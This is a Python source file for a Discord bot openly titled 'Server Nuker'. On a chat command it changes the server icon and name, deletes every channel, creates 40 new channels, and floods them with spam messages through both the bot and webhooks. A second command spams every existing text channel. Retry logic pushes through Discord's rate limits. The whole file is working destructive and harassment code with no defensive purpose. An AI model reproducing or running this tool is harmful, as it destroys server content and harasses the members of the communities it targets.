import discord, asyncio, toml, random, toml
import os
import datetime

from util.terminalwithtime import *

# Terminal utility
t = terminal

settings = toml.load('./util/settings.toml')
name = settings['general']['name']

class nuker:
    def __init__(self):
        t.setTitle("Server Nuker")
        
        # Enable necessary intents
        intents = discord.Intents.default()
        intents.message_content = True  # Enable message content intent

        self.client = discord.Client(intents=intents)
        
        # Load configuration from config.toml
        self.config = self.load_config()

        # Variables for message counting
        self.messages_sent = 0
        self.start_time = datetime.datetime.now()

        # Event listener for when the bot is ready
        @self.client.event
        async def on_ready():
            t.print.info(f'For nuking, write: \'{self.config["commands"]["nuker"]}\'')
            t.print.success(f'Logged in as {self.client.user}')

        # Event listener for messages
        @self.client.event
        async def on_message(message):
            if message.content.lower() == self.config['commands']['nuker']:
                # Get the current working directory
                current_dir = os.path.dirname(os.path.abspath(__file__))
                icon_path = os.path.join(current_dir, 'defaulticon.png')
                
                with open(icon_path, 'rb') as f:
                    icon = f.read()

                try:
                    await message.guild.edit(icon=icon)
                    t.print.success(f"Successfully changed guild icon for {message.guild.name}")
                except discord.HTTPException as e:
                    t.print.fail(f'Failed to change guild icon: {e}')
                
                await self.nuke_server(message.guild)
            elif message.content.lower() == self.config['commands']['spammer']:
                await self.send_messages_to_all_channels(message.guild)
                
    def load_config(self):
        # Get the current working directory
        current_dir = os.path.dirname(os.path.abspath(__file__))
        config_path = os.path.join(current_dir, 'config.toml')

        # Check if the config file exists
        if not os.path.isfile(config_path):
            t.print.fail(f'Config file not found at {config_path}')
            exit(1)

        # Load the config file
        with open(config_path, 'r', encoding='utf-8') as f:
            config = toml.load(f)
        return config

    async def delete_channel(self, channel):
        try:
            await channel.delete()
            t.print.success(f"Successfully deleted channel: {channel.name}")
        except discord.HTTPException as e:
            if e.code == 429:  # Rate limited
                wait_time = self.config['rate_limit']['wait_time'] # Default wait time is 5 seconds
                t.print.warn(f'Rate limited, waiting for {wait_time} seconds...')
                await asyncio.sleep(wait_time)
                await self.delete_channel(channel)  # Retry deleting the channel
            else:
                t.print.fail(f'Error deleting channel: {channel.name}, {e}')

    async def create_and_populate_channel(self, guild, channel_name):
        try:
            new_channel = await guild.create_text_channel(channel_name)
            t.print.success(f"Successfully created channel: {new_channel.name}")

            # Create a webhook
            webhook = await new_channel.create_webhook(name=self.config['webhook']['name'])
            t.print.info(f"Webhook created: {webhook.name}")

            # Send messages via bot and webhook concurrently
            message_content = self.config['message']['spam_message']
            bot_tasks = [asyncio.create_task(new_channel.send(message_content)) for _ in range(self.config['message']['amount'])]
            webhook_tasks = [asyncio.create_task(webhook.send(message_content)) for _ in range(self.config['message']['amount'])]
            
            all_tasks = bot_tasks + webhook_tasks
            await asyncio.gather(*all_tasks)
            
            self.messages_sent += len(all_tasks)
            t.print.success(f"Successfully sent {len(all_tasks)} messages via bot and webhook.")

        except discord.HTTPException as e:
            if e.code == 429:  # Rate limited
                wait_time = self.config['rate_limit']['wait_time'] # Default wait time is 5 seconds
                t.print.warn(f'Rate limited, waiting for {wait_time} seconds...')
                await asyncio.sleep(wait_time)
                await self.create_and_populate_channel(guild, channel_name)  # Retry creating and populating the channel
            else:
                t.print.fail(f'Error creating or populating channel: {channel_name}, {e}')
    
    async def send_messages_to_all_channels(self, guild):
        try:
            message_content = self.config['message']['spam_message']
            tasks = []

            for channel in guild.channels:
                if isinstance(channel, discord.TextChannel):  # Ensure the channel is a text channel
                    # Create webhook for the channel
                    webhook = await channel.create_webhook(name=self.config['webhook']['name'])
                    t.print.info(f"Webhook created in channel {channel.name}: {webhook.name}")

                    # Send messages via bot and webhook concurrently
                    bot_tasks = [asyncio.create_task(channel.send(message_content)) for _ in range(50)]
                    webhook_tasks = [asyncio.create_task(webhook.send(message_content)) for _ in range(50)]
                    
                    all_tasks = bot_tasks + webhook_tasks
                    tasks.extend(all_tasks)
                    
                    self.messages_sent += len(all_tasks)
                    t.print.success(f"Successfully scheduled {len(all_tasks)} messages to be sent to channel: {channel.name}")

            await asyncio.gather(*tasks)  # Wait for all tasks to complete
        except discord.HTTPException as e:
            if e.code == 429:  # Rate limited
                wait_time = self.config['rate_limit']['wait_time']  # Default wait time is 5 seconds
                t.print.warn(f'Rate limited, waiting for {wait_time} seconds...')
                await asyncio.sleep(wait_time)
                await self.send_messages_to_all_channels(guild)  # Retry sending messages
            else:
                t.print.fail(f'Error sending messages to channels: {e}')

    async def nuke_server(self, guild):
        try:
            # Change server name
            await guild.edit(name=self.config['server']['name'])
            t.print.success(f"Server name changed to: {self.config['server']['name']}")

            # Delete all channels
            delete_tasks = [self.delete_channel(channel) for channel in guild.channels]
            await asyncio.gather(*delete_tasks)

            # Create new channels and send messages
            channel_names = self.config['channel_names']['names']
            create_tasks = [self.create_and_populate_channel(guild, random.choice(channel_names)) for _ in range(40)]
            await asyncio.gather(*create_tasks)

            t.print.success("Server nuked successfully.")
        except discord.HTTPException as e:
            t.print.fail(f'Error editing server: {e}')

    @staticmethod
    def main():
        token = input(Colorate.Horizontal(Colors.red_to_purple, f"{name.lower()}@nuker → token~ ", 1))

        try:
            if token:
                nuker_instance = nuker()
                nuker_instance.client.run(token)
            else:
                t.print.fail(f"No token provided, exiting {name.capitalize()} nuker.")
        except:
            t.print.fail(f"Invalid token provided, exiting {name.capitalize()} nuker.")